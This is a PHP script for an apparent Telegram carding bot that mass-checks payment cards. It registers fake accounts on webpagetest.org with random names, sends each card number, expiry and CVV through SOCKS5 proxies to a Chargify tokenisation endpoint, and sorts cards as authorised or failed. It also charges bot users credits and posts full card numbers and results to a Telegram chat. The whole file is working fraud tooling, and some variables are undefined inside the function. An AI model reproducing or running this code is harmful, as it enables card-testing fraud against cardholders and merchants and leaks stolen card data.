<?php

/*if ($text == 'mass') {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Braintree Auth Mass Check- mass \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
*/
//include 'Tools/Antispam.php';

$file = 'file.txt';
unlink($file);

$ccards = substr($text, 4);
$lista = explode("\n", $ccards);

$F = ucfirst(str_shuffle('bdfkjdgjdrtgbrhdtg'));
$L = ucfirst(str_shuffle('trbhrtbhtrfbh'));
$C = ucfirst(str_shuffle('waidfbfuu efreegwrb'));
$first1 = str_shuffle("kurumiapp85246");
$E = "$F@gmail.com";
$numcc = count($lista);

function CardChecking($single_card) {
  
$i = explode("|", $single_card);
$cc = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon = $i[1];
$year = $i[2];
$cvv = $i[3];

if(strlen($year) == 4){
$year = substr($year, 2);
};

$url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => "$cc | $mon | $year - $cvv - $ccards |",
        'reply_to_message_id' => $message_id ));
    $response = sendAsyncRequest($url, $data);

  include 'Tools/Proxy.php';
  
#1. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'referer: https://www.webpagetest.org/',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl1 = curl_exec($ch);
$at = trim(strip_tags(getStr($curl1,'auth_token" value="','"')));

# 2 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.webpagetest.org',
'referer: https://www.webpagetest.org/signup',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'csrf_token=&auth_token='.$at.'&step=1&plan=MP5&billing-cycle=monthly');
$curl2 = curl_exec($ch);

# 3 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.webpagetest.org/signup');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.webpagetest.org',
'referer: https://www.webpagetest.org/signup/2',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'first-name='.$F.'&last-name='.$L.'&company-name='.$C.'&email='.$E.'%40gmail.com&password=Joker%402019&confirm-password=Joker%402019&street-address=gardenia+drive+6767&city=San+Jose&state=CA&country=US&zipcode=92055&csrf_token=&auth_token='.$at.'&plan=MP5&step=2');
$curl3 = curl_exec($ch);

# 4 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://catchpoint.chargify.com/js/tokens.json');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'Content-Type: application/json',
'Host: catchpoint.chargify.com',
'Origin: https://js.chargify.com',
'Referer: https://js.chargify.com/',
'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"key":"chjs_6nx8y5rbw875f78dn5yx7n9g","revision":"2022-12-05","credit_card":{"first_name":"jay","last_name":"mehta","full_number":"'.$cc.'","expiration_month":"'.$mon.'","expiration_year":"'.$year.'","cvv":"'.$cvv.'","device_data":"","billing_address":"gardenia drive 6767","billing_city":"San Jose","billing_state":"CA","billing_country":"US","billing_zip":"92055"},"origin":"https://www.webpagetest.org"}');
$curl4 = curl_exec($ch);
$rsp = trim(strip_tags(getStr($curl4,'errors":','}')));

if (strpos($curl4, 'Approved (1000)'))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
$creditsFile = fopen('Tools/Credits.txt', 'r+');
while (!feof($creditsFile)) {
    $line = fgets($creditsFile);
    $lineParts = explode(' ', $line);
    $userIdd = trim($lineParts[0]);
    $credits = intval(trim($lineParts[1]));
    if ($userIdd == $userId) {
        $newCredits = max(0, $credits - $creditsToDeduct);
        fseek($creditsFile, -strlen($line), SEEK_CUR);
        fwrite($creditsFile, "$userId $newCredits\n");
        break;}}
fclose($creditsFile);
  
if (strpos($curl4, '1000')) {
$ccrsp = "--» <u>Card 💳</u> : <code>$cards</code>\n--» <u>Status </u> : ✅ Card Authorized Charge Failed ( $rsp )";
}
elseif (strpos($curl4, 'Insufficient')){
$ccrsp = "--» <u>Card 💳</u> : <code>$cards</code>\n--» <u>Status </u> : ✅ Card Authorized Charge Failed ( $rsp )";
}
else{
$ccrsp = "--» <u>Card 💳</u> : <code>$cards</code>\n--» <u>Status </u> : ❌ Failed To Auth ( $rsp )";
}

$file = 'file.txt';
$current = file_get_contents($file);
$current .= $ccrsp . "\n\n";
file_put_contents($file, $current);
$allrsp = file_get_contents($file);
  
$url = 'https://api.telegram.org/bot' . $bot_token . '/editMessageText';
$data = http_build_query(array(
    'chat_id' => $chat_id,
    'message_id' => $message_idd,
    'text' => "$allrsp | $checkedCards | $numcc |",
    'parse_mode' => 'HTML'
));
sendAsyncRequest($url, $data);

  return $ccrsp;
}

foreach ($lista as $single_card) {
  $ccrsp = CardChecking($single_card);
    }

$url = 'https://api.telegram.org/bot' . $bot_token . '/sendMessage';
$data = http_build_query(array(
    'chat_id' => $chat_id,
    'text' => "$allrsp",
    'reply_to_message_id' => $message_id,
    'parse_mode' => 'HTML'
));
sendAsyncRequest($url, $data);

?>